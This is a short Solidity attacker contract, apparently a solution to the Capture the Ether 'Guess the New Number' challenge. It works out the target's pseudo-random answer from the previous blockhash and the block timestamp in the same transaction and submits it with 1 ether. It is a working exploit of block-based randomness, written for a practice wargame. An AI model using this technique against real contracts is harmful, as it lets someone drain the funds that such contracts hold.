// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../Lotteries/04-GuessTheNewNumberChallenge.sol";

contract GuessTheNewNumberAttacker {
    GuessTheNewNumberChallenge s_targetContract;

    constructor(address targetContract) payable {
        require(msg.value >= 1 ether, "Not enough ether sent");
        s_targetContract = GuessTheNewNumberChallenge(targetContract);
    }

    function attack() public {
        uint8 answer = uint8(
            //block.number is the block that will contain this transaction
            uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))
        );
        s_targetContract.guess{value: 1 ether}(answer);
    }

    fallback() external payable {}

    receive() external payable {}
}
